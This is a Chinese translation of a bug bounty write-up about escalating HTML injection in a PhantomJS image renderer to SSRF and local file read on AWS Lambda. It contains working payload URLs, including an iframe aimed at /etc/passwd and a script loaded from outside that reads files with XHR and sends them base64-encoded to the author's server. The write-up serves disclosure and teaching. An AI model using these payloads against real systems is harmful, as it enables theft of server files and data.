> 原文链接: https://www.anquanke.com//post/id/86371 


# 【技术分享】从PhantomJS图片渲染中的XSS漏洞到SSRF/本地文件读取漏洞


                                阅读量   
                                **183382**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：buer.haus
                                <br>原文地址：[http://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/](http://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01aca1bd49cc007573.png)](https://p5.ssl.qhimg.com/t01aca1bd49cc007573.png)

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：170RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

**一、前言<br>**



最近我被邀请研究某个漏洞奖励项目，这个项目可以根据用户的输入生成一幅图片，以供用户下载。经过一段时间的探索，我找到了一条漏洞利用路径，可以利用图片内部的XSS漏洞最终实现服务器上本地任意文件的读取。这个项目涉及客户隐私，因此我会在保护隐私的前提下，尽可能详细地与大家分享技术细节。

<br>

**二、技术细节**



用户的正常请求遵循如下样式：

```
https://website/download?background=file.jpg&amp;author=Brett&amp;header=Test&amp;text=&amp;width=500&amp;height=500
```

服务器输出的文件如下所示：

[![](https://p5.ssl.qhimg.com/t0190000fbdd3a95f6d.png)](https://p5.ssl.qhimg.com/t0190000fbdd3a95f6d.png)

一开始时，我对请求URL中的background参数比较感兴趣，因为这个参数可以指定文件名，值得好好探索一番。然而经过仔细的研究，我发现真正存在漏洞的是header这个变量，该变量容易受到某种形式的HTML注入攻击的影响。我曾经学习过如何利用PDF文件内部的XSS漏洞触发严重漏洞的文章，因此我决定借鉴类似思路，进一步挖掘这个漏洞。

发送的请求如下：

```
https://website/download?background=file.jpg&amp;author=Brett&amp;header="&gt;&lt;u&gt;test&amp;text=&amp;width=500&amp;height=500
```

对应的输出为：

[![](https://p5.ssl.qhimg.com/t0153f798c36ab9feb2.png)](https://p5.ssl.qhimg.com/t0153f798c36ab9feb2.png)

将随机的HTML元素放到这个变量中后，我注意到大多数元素都会被成功渲染，比如iframe、img、script等。我决定以我自己的服务器为目标，看看能否获取更多信息，了解哪个程序在具体负责处理HTML数据。

发送的请求如下：

```
https://website/download?background=file.jpg&amp;author=Brett&amp;header=&lt;iframe src=https://xss.buer.haus/ssrftest&gt;&lt;/iframe&gt;&amp;text=&amp;width=500&amp;height=500
```

相应的输出为：

[![](https://p5.ssl.qhimg.com/t010d2d47caec6d23f6.png)](https://p5.ssl.qhimg.com/t010d2d47caec6d23f6.png)

在自己搭建的服务器上，我观察到如下信息：



```
[25/Jun/2017:20:31:49 -0400] "GET /ssrftest HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"
```

请求报文中的User-Agent字段表明目标服务器使用的是PhantomJS这种无界面浏览器（headless browser）客户端来加载HTML页面并生成图片数据。我对Phantom已经有一定的基础，因为它经常出现在CTF比赛中，并且我在自研的在线扫描器中也用到了这个工具来对网页进行截屏。早点得到这个信息是件好事，因为它回答了我在挖掘这个项目的漏洞时遇到的一些问题。

我遇到的第一个问题就是无法通过基本的载荷来保持JavaScript的持续运行。&lt;script&gt;&lt;/script&gt;无法正确执行，而&lt;img src=x onerror=&gt;的触发结果又不能保持一致性。经过测试，我发现100次尝试中只有1次成功完成了window.location的重定向。在某些情况下，测试载荷完全不会执行。更为严重的是，当我尝试重定向到另一个页面时，服务器返回了某些异常信息。

发送的请求如下：



```
https://website/download?background=file.jpg&amp;author=Brett&amp;header=&lt;img src="x" onerror="window.location='https://xss.buer.haus/'" /&gt;&amp;text=&amp;width=500&amp;height=500
```

服务器的响应为：



```
`{`"message": "Internal server error"`}`.
```

我总共尝试了50种不同类型的载荷，最后才意识到问题应该出自于PhantomJS的某种条件竞争缺陷。之前我在开发网页扫描器时，需要为Phantom写一款插件，当时也碰到了类似的问题，当时我尝试对某些网页进行截屏，程序没有等到JavaScript完全加载就已经返回了结果。

我需要找到一种解决办法，使得Phantom在截图渲染完毕之前处于等待状态，直到JavaScript加载完成为止。经过多次尝试后，最终我通过document.write函数完全覆盖了页面内容，这种方法似乎解决了这一问题，虽然我没搞清具体的原因。

具体的请求如下：



```
https://website/download?background=file.jpg&amp;author=Brett&amp;header=&lt;img src="x" onerror="document.write('test')" /&gt;&amp;text=&amp;width=500&amp;height=500
```

服务器返回的响应为：

[![](https://p3.ssl.qhimg.com/t0134dedde052d5de65.png)](https://p3.ssl.qhimg.com/t0134dedde052d5de65.png)

此时此刻，对于每个页面的加载过程，我都能获得一致性的JavaScript执行结果。下一步我需要做的就是尽可能多地收集PhantomJS的信息，以及当前页面执行点所在的上下文内容及具体位置。

发送的请求如下：



```
https://website/download?background=file.jpg&amp;author=Brett&amp;header=&lt;img src="x" onerror="document.write(window.location)" /&gt;&amp;text=&amp;width=500&amp;height=500
```

服务器返回的响应如下：

[![](https://p5.ssl.qhimg.com/t0147d6a9825c1a4250.png)](https://p5.ssl.qhimg.com/t0147d6a9825c1a4250.png)

从响应消息中我们可以发现，当前我们的执行点源自于“file://”处，这是一个HTML文件，位于“/var/task/”目录中。现在我想测试一下我能否利用iframe方式引用这个文件，以确认我与“/var/task/”位于同一个源。

发送的请求如下：



```
https://website/download?background=file.jpg&amp;author=Brett&amp;header=&lt;img src="xasdasdasd" onerror="document.write('&lt;iframe src=file:///var/task/[redacted].html&gt;&lt;/iframe&gt;')"/&gt;&amp;text=&amp;width=500&amp;height=500
```

服务器返回的响应如下：

[![](https://p4.ssl.qhimg.com/t01686b8e2f58557e12.png)](https://p4.ssl.qhimg.com/t01686b8e2f58557e12.png)

现在我至少可以确定我能够加载“/var/task/”目录中的文件，因此接下来我想进一步确认是否能够加载其他目录（如/etc/目录）中的文件。

发送的载荷如下：



```
&amp;header=&lt;img src="xasdasdasd" onerror="document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;')"/&gt;
```

然而服务器没有任何反馈。

我Google了一下“/var/tasks”，发现这个目录与AWS Lambda有关。根据搜索结果，我发现这个目录中存在某些文件，应该会包含Phantom插件的源代码，比如“/var/task/index.js”。我认为“/var/”目录中的这些文件可能会向我提供更多的信息，或者至少会包含某些值得分析的数据。

如果使用XHR技术、发送Ajax请求，我应该可以加载这些文件的内容，然后在图片中显示这些内容，或者将这些内容传输到我的服务器。当我想在document.write中直接使用这种JavaScript脚本时，我碰到了其他一些问题，最终我通过加载外部脚本的方式成功绕过了这些问题。

使用的载荷如下：



```
&amp;header=&lt;img src="xasdasdasd" onerror="document.write('&lt;script src="https://xss.buer.haus/test.js"&gt;&lt;/script&gt;')"/&gt;
```

test.js内容如下：



```
function reqListener () `{`
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write('&lt;iframe src="https://xss.buer.haus/exfil?data='+b64+'"&gt;&lt;/iframe&gt;');
`}` 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "file:///var/task/[redacted].html"); 
oReq.send();
```

想在不暴露敏感信息的同时向大家展示结果是件很困难的事情，因此在这里我就随便以服务器中的访问日志为例，展示我们所能获取的数据信息：

 [![](https://p3.ssl.qhimg.com/t013e7bfbfa9987c7b7.png)](https://p3.ssl.qhimg.com/t013e7bfbfa9987c7b7.png)

因此，我们已经能够通过越界JavaScript以及XHR技术，脱离file://文件的束缚，实现任意文件的读取。现在让我们再次将脚本指向“/etc/passwd”，检查是否能够读取到iframe无法读取的信息：

[![](https://p2.ssl.qhimg.com/t019b9a70b19066916b.png)](https://p2.ssl.qhimg.com/t019b9a70b19066916b.png)

非常好！虽然PhantomJS无法通过&lt;iframe src=”file://”&gt;方式加载“file://”文件的内容，但我们通过XHR技术却能做到这一点。

从整个过程来看，虽然XSS载荷可能有些相形见绌，但我还是花了很多精力，做了很多猜测才走到这一步。这是非常古怪的一个奖励项目，我觉得整个过程像是在解决某个CTF挑战，而不是在挖掘生产服务器的漏洞。虽然整个周末我花了很多时间来解决这个难题，但至少还是有所收获的。


